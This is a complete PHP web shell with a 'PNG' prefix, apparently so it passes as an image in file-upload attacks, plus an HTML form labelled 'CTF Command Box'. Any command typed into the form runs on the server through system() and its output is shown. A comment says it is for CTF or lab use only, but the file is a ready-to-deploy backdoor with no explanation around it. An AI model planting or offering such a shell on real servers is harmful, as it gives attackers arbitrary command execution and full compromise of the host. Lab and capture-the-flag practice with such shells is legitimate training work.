PNG
<?php
// WARNING: For CTF / local lab use ONLY. This is extremely insecure.
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];

    echo "<pre>";
    // Executes shell command and outputs result
    system($command);
    echo "</pre>";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>CTF Command Box</title>
</head>
<body>
    <h2>Command Execution Box</h2>
    <form method="POST">
        <input type="text" name="cmd" placeholder="Enter shell command" size="50">
        <button type="submit">Run</button>
    </form>
</body>
</html>
